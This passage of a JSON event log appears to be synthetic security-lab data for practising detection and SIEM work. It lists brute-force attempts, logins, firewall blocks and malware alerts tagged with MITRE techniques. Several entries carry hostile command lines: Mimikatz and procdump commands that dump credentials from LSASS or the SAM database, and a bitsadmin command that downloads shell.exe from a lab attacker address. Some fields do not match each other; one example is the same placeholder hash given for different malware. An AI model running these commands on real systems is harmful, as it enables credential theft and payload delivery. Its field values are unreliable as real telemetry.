    "ProcessName": null,
    "MalwareName": null,
    "FileHash": null,
    "ToolUsed": null
  },
  {
    "TimeGenerated": "2026-04-23T00:33:37.667953",
    "EventType": "Cloud IAM Change",
    "Severity": "High",
    "EventCode": null,
    "UserAccount": "temp.analyst",
    "Computer": null,
    "SourceIP": null,
    "DestinationIP": null,
    "MitreTechnique": "T1098",
    "LogSource": "CloudTrail / Azure AD",
    "IsLabAttack": false,
    "CommandLine": null,
    "ProcessName": null,
    "MalwareName": null,
    "FileHash": null,
    "ToolUsed": null
  },
  {
    "TimeGenerated": "2026-04-20T11:37:37.660561",
    "EventType": "Failed Login",
    "Severity": "Medium",
    "EventCode": 4625,
    "UserAccount": "attacker",
    "Computer": "DEV-SERVER-01",
    "SourceIP": "192.168.56.102",
    "DestinationIP": null,
    "MitreTechnique": "T1078",
    "LogSource": "Windows Security",
    "IsLabAttack": false,
    "CommandLine": null,
    "ProcessName": null,
    "MalwareName": null,
    "FileHash": null,
    "ToolUsed": null
  },
  {
    "TimeGenerated": "2026-04-22T09:51:37.662419",
    "EventType": "SSH Brute Force",
    "Severity": "High",
    "EventCode": null,
    "UserAccount": "ubuntu",
    "Computer": "SPLUNK-VM-01",
    "SourceIP": "192.168.56.104",
    "DestinationIP": null,
    "MitreTechnique": "T1110.001",
    "LogSource": "Linux Auth",
    "IsLabAttack": true,
    "CommandLine": null,
    "ProcessName": null,
    "MalwareName": null,
    "FileHash": null,
    "ToolUsed": "Hydra"
  },
  {
    "TimeGenerated": "2026-04-21T15:37:37.668314",
    "EventType": "Firewall Block",
    "Severity": "Low",
    "EventCode": null,
    "UserAccount": null,
    "Computer": null,
    "SourceIP": "185.220.101.45",
    "DestinationIP": "172.16.0.100",
    "MitreTechnique": null,
    "LogSource": "Firewall / UFW",
    "IsLabAttack": false,
    "CommandLine": null,
    "ProcessName": null,
    "MalwareName": null,
    "FileHash": null,
    "ToolUsed": null
  },
  {
    "TimeGenerated": "2026-04-21T01:54:37.667209",
    "EventType": "Credential Dumping",
    "Severity": "Critical",
    "EventCode": 10,
    "UserAccount": "lab.administrator",
    "Computer": "WIN-PRAHARSH-01",
    "SourceIP": null,
    "DestinationIP": null,
    "MitreTechnique": "T1003.001",
    "LogSource": "Sysmon Event ID 10",
    "IsLabAttack": true,
    "CommandLine": null,
    "ProcessName": "procdump.exe",
    "MalwareName": null,
    "FileHash": null,
    "ToolUsed": null
  },
  {
    "TimeGenerated": "2026-04-22T03:06:37.663340",
    "EventType": "Sysmon Process Create",
    "Severity": "Critical",
    "EventCode": 1,
    "UserAccount": "praharsh.admin",
    "Computer": "WIN-PRAHARSH-01",
    "SourceIP": null,
    "DestinationIP": null,
    "MitreTechnique": "T1003.001",
    "LogSource": "Sysmon",
    "IsLabAttack": true,
    "CommandLine": "mimikatz.exe lsadump::sam",
    "ProcessName": "procdump.exe",
    "MalwareName": null,
    "FileHash": null,
    "ToolUsed": null
  },
  {
    "TimeGenerated": "2026-04-20T21:28:37.660067",
    "EventType": "Failed Login",
    "Severity": "Medium",
    "EventCode": 4625,
    "UserAccount": "attacker",
    "Computer": "SPLUNK-VM-01",
    "SourceIP": "192.168.56.105",
    "DestinationIP": null,
    "MitreTechnique": "T1078",
    "LogSource": "Windows Security",
    "IsLabAttack": false,
    "CommandLine": null,
    "ProcessName": null,
    "MalwareName": null,
    "FileHash": null,
    "ToolUsed": null
  },
  {
    "TimeGenerated": "2026-04-24T08:17:37.660966",
    "EventType": "Successful Login",
    "Severity": "Info",
    "EventCode": 4624,
    "UserAccount": "praharsh.admin",
    "Computer": "FIN-SERVER-01",
    "SourceIP": "192.168.56.101",
    "DestinationIP": null,
    "MitreTechnique": null,
    "LogSource": "Windows Security",
    "IsLabAttack": false,
    "CommandLine": null,
    "ProcessName": null,
    "MalwareName": null,
    "FileHash": null,
    "ToolUsed": null
  },
  {
    "TimeGenerated": "2026-04-22T07:54:37.660844",
    "EventType": "Successful Login",
    "Severity": "Info",
    "EventCode": 4624,
    "UserAccount": "temp.analyst",
    "Computer": "DEV-SERVER-01",
    "SourceIP": "192.168.56.105",
    "DestinationIP": null,
    "MitreTechnique": null,
    "LogSource": "Windows Security",
    "IsLabAttack": false,
    "CommandLine": null,
    "ProcessName": null,
    "MalwareName": null,
    "FileHash": null,
    "ToolUsed": null
  },
  {
    "TimeGenerated": "2026-04-21T15:25:37.669361",
    "EventType": "Wazuh Alert",
    "Severity": "High",
    "EventCode": null,
    "UserAccount": null,
    "Computer": null,
    "SourceIP": null,
    "DestinationIP": null,
    "MitreTechnique": null,
    "LogSource": "Wazuh Manager",
    "IsLabAttack": false,
    "CommandLine": null,
    "ProcessName": null,
    "MalwareName": null,
    "FileHash": null,
    "ToolUsed": null
  },
  {
    "TimeGenerated": "2026-04-23T02:33:37.659839",
    "EventType": "Failed Login",
    "Severity": "Medium",
    "EventCode": 4625,
    "UserAccount": "lab.administrator",
    "Computer": "KALI-LAB-01",
    "SourceIP": "10.0.2.10",
    "DestinationIP": null,
    "MitreTechnique": "T1078",
    "LogSource": "Windows Security",
    "IsLabAttack": false,
    "CommandLine": null,
    "ProcessName": null,
    "MalwareName": null,
    "FileHash": null,
    "ToolUsed": null
  },
  {
    "TimeGenerated": "2026-04-20T21:41:37.662241",
    "EventType": "RDP Brute Force",
    "Severity": "High",
    "EventCode": 4625,
    "UserAccount": "john.doe",
    "Computer": "WIN-PRAHARSH-01",
    "SourceIP": "192.168.56.104",
    "DestinationIP": null,
    "MitreTechnique": "T1110.003",
    "LogSource": "Windows Security",
    "IsLabAttack": true,
    "CommandLine": null,
    "ProcessName": null,
    "MalwareName": null,
    "FileHash": null,
    "ToolUsed": "Hydra / CrackMapExec"
  },
  {
    "TimeGenerated": "2026-04-21T20:04:37.668076",
    "EventType": "Impossible Travel",
    "Severity": "High",
    "EventCode": null,
    "UserAccount": "attacker",
    "Computer": null,
    "SourceIP": null,
    "DestinationIP": null,
    "MitreTechnique": "T1078.004",
    "LogSource": "Azure AD / Okta",
    "IsLabAttack": false,
    "CommandLine": null,
    "ProcessName": null,
    "MalwareName": null,
    "FileHash": null,
    "ToolUsed": null
  },
  {
    "TimeGenerated": "2026-04-20T22:22:37.660984",
    "EventType": "Successful Login",
    "Severity": "Info",
    "EventCode": 4624,
    "UserAccount": "finance.user",
    "Computer": "WIN-PRAHARSH-01",
    "SourceIP": "10.0.2.15",
    "DestinationIP": null,
    "MitreTechnique": null,
    "LogSource": "Windows Security",
    "IsLabAttack": false,
    "CommandLine": null,
    "ProcessName": null,
    "MalwareName": null,
    "FileHash": null,
    "ToolUsed": null
  },
  {
    "TimeGenerated": "2026-04-19T19:15:37.668409",
    "EventType": "Firewall Block",
    "Severity": "Low",
    "EventCode": null,
    "UserAccount": null,
    "Computer": null,
    "SourceIP": "23.129.64.100",
    "DestinationIP": "172.16.0.100",
    "MitreTechnique": null,
    "LogSource": "Firewall / UFW",
    "IsLabAttack": false,
    "CommandLine": null,
    "ProcessName": null,
    "MalwareName": null,
    "FileHash": null,
    "ToolUsed": null
  },
  {
    "TimeGenerated": "2026-04-19T15:17:37.666199",
    "EventType": "C2 Outbound Connection",
    "Severity": "Critical",
    "EventCode": null,
    "UserAccount": null,
    "Computer": "WIN-PRAHARSH-01",
    "SourceIP": "192.168.56.105",
    "DestinationIP": "192.168.56.104",
    "MitreTechnique": "T1071.001",
    "LogSource": "Firewall / Sysmon",
    "IsLabAttack": true,
    "CommandLine": null,
    "ProcessName": null,
    "MalwareName": null,
    "FileHash": null,
    "ToolUsed": null
  },
  {
    "TimeGenerated": "2026-04-23T08:03:37.665331",
    "EventType": "Privilege Escalation",
    "Severity": "Critical",
    "EventCode": 4672,
    "UserAccount": "svc.backup",
    "Computer": "DEV-SERVER-01",
    "SourceIP": null,
    "DestinationIP": null,
    "MitreTechnique": "T1068",
    "LogSource": "Windows Security",
    "IsLabAttack": true,
    "CommandLine": null,
    "ProcessName": null,
    "MalwareName": null,
    "FileHash": null,
    "ToolUsed": null
  },
  {
    "TimeGenerated": "2026-04-23T03:38:37.668373",
    "EventType": "Firewall Block",
    "Severity": "Low",
    "EventCode": null,
    "UserAccount": null,
    "Computer": null,
    "SourceIP": "23.129.64.100",
    "DestinationIP": "10.0.2.10",
    "MitreTechnique": null,
    "LogSource": "Firewall / UFW",
    "IsLabAttack": false,
    "CommandLine": null,
    "ProcessName": null,
    "MalwareName": null,
    "FileHash": null,
    "ToolUsed": null
  },
  {
    "TimeGenerated": "2026-04-23T08:07:37.668398",
    "EventType": "Firewall Block",
    "Severity": "Low",
    "EventCode": null,
    "UserAccount": null,
    "Computer": null,
    "SourceIP": "192.168.56.104",
    "DestinationIP": "10.0.2.15",
    "MitreTechnique": null,
    "LogSource": "Firewall / UFW",
    "IsLabAttack": false,
    "CommandLine": null,
    "ProcessName": null,
    "MalwareName": null,
    "FileHash": null,
    "ToolUsed": null
  },
  {
    "TimeGenerated": "2026-04-22T19:22:37.667307",
    "EventType": "Malware Detected",
    "Severity": "High",
    "EventCode": null,
    "UserAccount": null,
    "Computer": "SPLUNK-VM-01",
    "SourceIP": null,
    "DestinationIP": null,
    "MitreTechnique": null,
    "LogSource": "Windows Defender / Wazuh",
    "IsLabAttack": false,
    "CommandLine": null,
    "ProcessName": null,
    "MalwareName": "Meterpreter",
    "FileHash": "5f4dcc3b5aa765d61d8327deb882cf99",
    "ToolUsed": null
  },
  {
    "TimeGenerated": "2026-04-24T13:46:37.667569",
    "EventType": "Process Injection",
    "Severity": "Critical",
    "EventCode": 8,
    "UserAccount": null,
    "Computer": "WIN-DC-PRAHARSH",
    "SourceIP": null,
    "DestinationIP": null,
    "MitreTechnique": "T1055",
    "LogSource": "Sysmon Event ID 8",
    "IsLabAttack": false,
    "CommandLine": null,
    "ProcessName": null,
    "MalwareName": null,
    "FileHash": null,
    "ToolUsed": null
  },
  {
    "TimeGenerated": "2026-04-22T09:58:37.661602",
    "EventType": "Brute Force Attempt",
    "Severity": "High",
    "EventCode": 4625,
    "UserAccount": "lab.administrator",
    "Computer": "WIN-PRAHARSH-01",
    "SourceIP": "192.168.56.104",
    "DestinationIP": "192.168.56.105",
    "MitreTechnique": "T1110.001",
    "LogSource": "Windows Security",
    "IsLabAttack": true,
    "CommandLine": null,
    "ProcessName": null,
    "MalwareName": null,
    "FileHash": null,
    "ToolUsed": "Hydra"
  },
  {
    "TimeGenerated": "2026-04-21T22:55:37.665424",
    "EventType": "RDP Login",
    "Severity": "Medium",
    "EventCode": 4624,
    "UserAccount": "svc.backup",
    "Computer": null,
    "SourceIP": "172.16.0.100",
    "DestinationIP": null,
    "MitreTechnique": "T1021.001",
    "LogSource": "Windows Security",
    "IsLabAttack": false,
    "CommandLine": null,
    "ProcessName": null,
    "MalwareName": null,
    "FileHash": null,
    "ToolUsed": null
  },
  {
    "TimeGenerated": "2026-04-23T14:26:37.667917",
    "EventType": "Cloud IAM Change",
    "Severity": "High",
    "EventCode": null,
    "UserAccount": "temp.analyst",
    "Computer": null,
    "SourceIP": null,
    "DestinationIP": null,
    "MitreTechnique": "T1098",
    "LogSource": "CloudTrail / Azure AD",
    "IsLabAttack": false,
    "CommandLine": null,
    "ProcessName": null,
    "MalwareName": null,
    "FileHash": null,
    "ToolUsed": null
  },
  {
    "TimeGenerated": "2026-04-20T09:47:37.664904",
    "EventType": "LOLBIN Execution",
    "Severity": "High",
    "EventCode": 1,
    "UserAccount": "svc.backup",
    "Computer": "WIN-PRAHARSH-01",
    "SourceIP": null,
    "DestinationIP": null,
    "MitreTechnique": "T1218",
    "LogSource": "Sysmon",
    "IsLabAttack": true,
    "CommandLine": "bitsadmin /transfer job /download /priority normal http://192.168.56.104/shell.exe",
    "ProcessName": "mshta.exe",
    "MalwareName": null,
    "FileHash": null,
    "ToolUsed": null
  },
  {
    "TimeGenerated": "2026-04-21T06:35:37.669352",
    "EventType": "Wazuh Alert",
    "Severity": "Medium",
    "EventCode": null,
    "UserAccount": null,
    "Computer": null,
    "SourceIP": null,
    "DestinationIP": null,
    "MitreTechnique": null,
    "LogSource": "Wazuh Manager",
    "IsLabAttack": false,
    "CommandLine": null,
    "ProcessName": null,
    "MalwareName": null,
    "FileHash": null,
    "ToolUsed": null
  },
  {
    "TimeGenerated": "2026-04-21T14:30:37.662570",
    "EventType": "SSH Brute Force",
    "Severity": "High",
    "EventCode": null,
    "UserAccount": "splunk",
    "Computer": "SPLUNK-VM-01",
    "SourceIP": "192.168.56.104",
    "DestinationIP": null,
    "MitreTechnique": "T1110.001",
    "LogSource": "Linux Auth",
    "IsLabAttack": true,
    "CommandLine": null,
    "ProcessName": null,
    "MalwareName": null,
    "FileHash": null,
    "ToolUsed": "Hydra"
  },
  {
    "TimeGenerated": "2026-04-19T23:54:37.667819",
    "EventType": "Cloud IAM Change",
    "Severity": "High",
    "EventCode": null,
    "UserAccount": "temp.analyst",
    "Computer": null,
    "SourceIP": null,
    "DestinationIP": null,
    "MitreTechnique": "T1098",
    "LogSource": "CloudTrail / Azure AD",
    "IsLabAttack": false,
    "CommandLine": null,
    "ProcessName": null,
    "MalwareName": null,
    "FileHash": null,
    "ToolUsed": null
  },
  {
    "TimeGenerated": "2026-04-21T00:01:37.663426",
    "EventType": "Sysmon Network Connection",
    "Severity": "High",
    "EventCode": 3,
    "UserAccount": "attacker",
    "Computer": "WIN-PRAHARSH-01",
    "SourceIP": "192.168.56.105",
    "DestinationIP": "185.220.101.45",
    "MitreTechnique": "T1071.001",
    "LogSource": "Sysmon",
    "IsLabAttack": false,
    "CommandLine": null,
    "ProcessName": "regsvr32.exe",
    "MalwareName": null,
    "FileHash": null,
    "ToolUsed": null
  },
  {
    "TimeGenerated": "2026-04-21T23:05:37.667790",
    "EventType": "Ransomware Activity",
    "Severity": "Critical",
    "EventCode": null,
    "UserAccount": null,
    "Computer": "FIN-SERVER-01",
    "SourceIP": null,
    "DestinationIP": null,
    "MitreTechnique": "T1486",
    "LogSource": "Sysmon / EDR",
    "IsLabAttack": false,
    "CommandLine": null,
    "ProcessName": null,
    "MalwareName": null,
    "FileHash": null,
    "ToolUsed": null
  },
  {
    "TimeGenerated": "2026-04-20T13:43:37.664655",
    "EventType": "PowerShell Execution",
    "Severity": "High",
    "EventCode": 4104,
    "UserAccount": "jane.smith",
    "Computer": "ELK-SERVER-01",
    "SourceIP": null,
    "DestinationIP": null,
    "MitreTechnique": "T1059.001",
    "LogSource": "Windows PowerShell",
    "IsLabAttack": false,
    "CommandLine": "powershell Invoke-Mimikatz",
    "ProcessName": null,
    "MalwareName": null,
    "FileHash": null,
    "ToolUsed": null
  },
  {
    "TimeGenerated": "2026-04-24T09:09:37.661755",
    "EventType": "RDP Brute Force",
    "Severity": "High",
    "EventCode": 4625,
    "UserAccount": "temp.analyst",
    "Computer": "WIN-PRAHARSH-01",
    "SourceIP": "192.168.56.104",
    "DestinationIP": null,
    "MitreTechnique": "T1110.003",
    "LogSource": "Windows Security",
    "IsLabAttack": true,
    "CommandLine": null,
    "ProcessName": null,
    "MalwareName": null,
    "FileHash": null,
    "ToolUsed": "Hydra / CrackMapExec"
  },
  {
    "TimeGenerated": "2026-04-22T10:26:37.667732",
    "EventType": "Ransomware Activity",
    "Severity": "Critical",
    "EventCode": null,
    "UserAccount": null,
    "Computer": "WIN-PRAHARSH-01",
    "SourceIP": null,
    "DestinationIP": null,
    "MitreTechnique": "T1486",
    "LogSource": "Sysmon / EDR",
    "IsLabAttack": false,
    "CommandLine": null,
    "ProcessName": null,
    "MalwareName": null,
    "FileHash": null,
    "ToolUsed": null
  },
  {
    "TimeGenerated": "2026-04-19T19:28:37.659603",
    "EventType": "Failed Login",
    "Severity": "Medium",
    "EventCode": 4625,
    "UserAccount": "temp.analyst",
    "Computer": "DEV-SERVER-01",
    "SourceIP": "23.129.64.100",
    "DestinationIP": null,
    "MitreTechnique": "T1078",
    "LogSource": "Windows Security",
    "IsLabAttack": false,
    "CommandLine": null,
    "ProcessName": null,
    "MalwareName": null,
    "FileHash": null,
    "ToolUsed": null
  },
  {
    "TimeGenerated": "2026-04-22T15:52:37.669153",
    "EventType": "Phishing Email",
    "Severity": "High",
    "EventCode": null,
    "UserAccount": null,
    "Computer": null,
    "SourceIP": null,
    "DestinationIP": null,
    "MitreTechnique": "T1566.001",
    "LogSource": "Email Gateway",
    "IsLabAttack": false,
    "CommandLine": null,
    "ProcessName": null,
    "MalwareName": null,
    "FileHash": null,
    "ToolUsed": null
  },
  {
    "TimeGenerated": "2026-04-23T15:10:37.667984",
    "EventType": "Cloud IAM Change",
    "Severity": "High",
    "EventCode": null,
    "UserAccount": "temp.analyst",
    "Computer": null,
    "SourceIP": null,
    "DestinationIP": null,
    "MitreTechnique": "T1098",
    "LogSource": "CloudTrail / Azure AD",
    "IsLabAttack": false,
    "CommandLine": null,
    "ProcessName": null,
    "MalwareName": null,
    "FileHash": null,
    "ToolUsed": null
  },
  {
    "TimeGenerated": "2026-04-23T19:24:37.667300",
    "EventType": "Malware Detected",
    "Severity": "High",
    "EventCode": null,
    "UserAccount": null,
    "Computer": "WIN-DC-PRAHARSH",
    "SourceIP": null,
    "DestinationIP": null,
    "MitreTechnique": null,
    "LogSource": "Windows Defender / Wazuh",
    "IsLabAttack": false,
    "CommandLine": null,
    "ProcessName": null,
    "MalwareName": "Mimikatz",
    "FileHash": "5f4dcc3b5aa765d61d8327deb882cf99",
    "ToolUsed": null
  },
  {
    "TimeGenerated": "2026-04-20T08:02:37.662233",
    "EventType": "RDP Brute Force",
    "Severity": "High",
    "EventCode": 4625,
    "UserAccount": "lab.administrator",
    "Computer": "WIN-PRAHARSH-01",
    "SourceIP": "192.168.56.104",
    "DestinationIP": null,
    "MitreTechnique": "T1110.003",
    "LogSource": "Windows Security",
    "IsLabAttack": true,
    "CommandLine": null,
    "ProcessName": null,
    "MalwareName": null,
    "FileHash": null,
    "ToolUsed": "Hydra / CrackMapExec"
  },
  {
    "TimeGenerated": "2026-04-20T15:20:37.669002",
    "EventType": "IDS Alert",
    "Severity": "High",
    "EventCode": null,
    "UserAccount": null,
    "Computer": null,
    "SourceIP": "10.0.2.15",
    "DestinationIP": "45.67.22.10",
    "MitreTechnique": null,
    "LogSource": "Suricata / Snort",
    "IsLabAttack": false,
    "CommandLine": null,
    "ProcessName": null,
    "MalwareName": null,
    "FileHash": null,
    "ToolUsed": null
  },
  {
    "TimeGenerated": "2026-04-20T20:19:37.663275",
    "EventType": "Sysmon Process Create",
    "Severity": "Critical",
    "EventCode": 1,
    "UserAccount": "praharsh.admin",
    "Computer": "WIN-PRAHARSH-01",
    "SourceIP": null,
    "DestinationIP": null,
    "MitreTechnique": "T1003.001",
    "LogSource": "Sysmon",
    "IsLabAttack": true,
    "CommandLine": "procdump.exe -ma lsass.exe lsass.dmp",
    "ProcessName": "procdump.exe",
    "MalwareName": null,
    "FileHash": null,
    "ToolUsed": null
  },
